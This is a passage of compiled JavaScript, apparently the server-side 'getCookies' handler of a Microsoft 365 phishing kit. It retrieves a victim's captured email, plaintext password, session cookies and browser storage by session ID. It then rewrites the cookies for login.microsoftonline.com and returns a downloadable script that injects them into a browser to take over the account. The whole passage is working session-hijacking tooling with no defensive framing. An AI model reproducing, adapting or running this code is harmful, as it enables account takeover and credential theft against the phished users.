          cookiesData = JSON.parse(cookieSpecificData);
        }
      } catch (error) {
        console.error("Error getting cookies by session ID:", error);
      }
    }
    if (!cookiesData) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({
          error: "No cookies found for the specified session",
          sessionId,
          email
        })
      };
    }
    console.log("\u2705 Found cookies data:", {
      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
      email: cookiesData.email,
      hasFormattedCookies: Array.isArray(cookiesData.formattedCookies),
      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
    });
    const clientIP = getClientIP();
    const userEmail = cookiesData.email || "Not captured";
    const userPassword = cookiesData.password || "Not captured";
    console.log("\u{1F4CA} Processing cookies data:", {
      email: userEmail,
      cookieCount: Array.isArray(cookiesData.cookies) ? cookiesData.cookies.length : 0,
      cookieType: typeof cookiesData.cookies,
      formattedCookieCount: Array.isArray(cookiesData.formattedCookies) ? cookiesData.formattedCookies.length : 0
    });
    let processedCookies = [];
    if (Array.isArray(cookiesData.formattedCookies) && cookiesData.formattedCookies.length > 0) {
      processedCookies = cookiesData.formattedCookies.filter((cookie) => cookie && cookie.name);
      console.log("\u2705 Using formattedCookies:", processedCookies.length);
    } else if (Array.isArray(cookiesData.cookies)) {
      processedCookies = cookiesData.cookies.filter((cookie) => cookie && cookie.name);
      console.log("\u2705 Using regular cookies:", processedCookies.length);
    } else if (typeof cookiesData.cookies === "string" && cookiesData.cookies !== "No cookies found") {
      try {
        const parsedCookies = JSON.parse(cookiesData.cookies);
        if (Array.isArray(parsedCookies)) {
          processedCookies = parsedCookies.filter((cookie) => cookie && cookie.name);
        }
      } catch (e) {
        if (cookiesData.cookies.includes("=")) {
          const cookieStrings = cookiesData.cookies.split(";");
          processedCookies = cookieStrings.map((cookieStr) => {
            const [name, ...valueParts] = cookieStr.trim().split("=");
            const value = valueParts.join("=");
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: ".login.microsoftonline.com",
              path: "/",
              secure: true,
              httpOnly: false,
              sameSite: "none",
              expirationDate: Math.floor(Date.now() / 1e3) + 365 * 24 * 60 * 60,
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          }).filter((cookie) => cookie !== null);
        }
      }
    }
    if (processedCookies.length === 0 && cookiesData.documentCookies && typeof cookiesData.documentCookies === "string") {
      const cookieStrings = cookiesData.documentCookies.split(";");
      processedCookies = cookieStrings.map((cookieStr) => {
        const [name, ...valueParts] = cookieStr.trim().split("=");
        const value = valueParts.join("=");
        return name && value ? {
          name: name.trim(),
          value: value.trim(),
          domain: ".login.microsoftonline.com",
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "none",
          expirationDate: Math.floor(Date.now() / 1e3) + 365 * 24 * 60 * 60,
          hostOnly: false,
          session: false,
          storeId: null
        } : null;
      }).filter((cookie) => cookie !== null);
      console.log("\u2705 Using documentCookies:", processedCookies.length);
    }
    const formattedCookies = processedCookies.map((cookie) => ({
      ...cookie,
      domain: ".login.microsoftonline.com",
      expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1e3) + 365 * 24 * 60 * 60,
      hostOnly: cookie.hostOnly !== void 0 ? cookie.hostOnly : false,
      httpOnly: cookie.httpOnly !== void 0 ? cookie.httpOnly : false,
      name: cookie.name || "",
      path: cookie.path || "/",
      sameSite: cookie.sameSite || "none",
      secure: cookie.secure !== void 0 ? cookie.secure : true,
      session: cookie.session !== void 0 ? cookie.session : false,
      storeId: cookie.storeId || null,
      value: cookie.value || ""
    }));
    const jsInjectionCode = formattedCookies.length > 0 ? `!function(){console.log("%c COOKIES LOADED","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(formattedCookies))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;console.log("Cookie set:",o.name);setTimeout(()=>location.reload(),1000)}();` : `console.log("%c NO COOKIES AVAILABLE","background:red;color:#fff;font-size:30px;");alert("No cookies found for this session.");`;
    const output = `// Microsoft 365 Cookie restoration for ${userEmail}
// Generated: ${(/* @__PURE__ */ new Date()).toISOString()}
// Cookies found: ${formattedCookies.length}
// Session ID: ${sessionId}
// Email: ${userEmail}

let ipaddress = "${clientIP}";
let email = "${userEmail}";
let password = "${userPassword}";
let sessionId = "${sessionId}";

console.log("Session Info:", {email, password, cookieCount: ${formattedCookies.length}});

${jsInjectionCode}

// Cookie Data:
${JSON.stringify(formattedCookies, null, 2)}

// Local Storage:
// ${cookiesData.localStorage || "Empty"}

// Session Storage:
// ${cookiesData.sessionStorage || "Empty"}`;
    return {
      statusCode: 200,
      headers: {
        ...headers,
        "Content-Type": "text/javascript",
        "Content-Disposition": `attachment; filename="microsoft365_cookies_${userEmail.replace("@", "_at_")}_${Date.now()}.js"`
      },
      body: output
    };
  } catch (error) {
    console.error("\u274C Error in getCookies function:", error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: "Internal server error",
        details: error.message,
        timestamp: (/* @__PURE__ */ new Date()).toISOString()
      })
    };
  }
};
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {
  handler
});
//# sourceMappingURL=getCookies.js.map
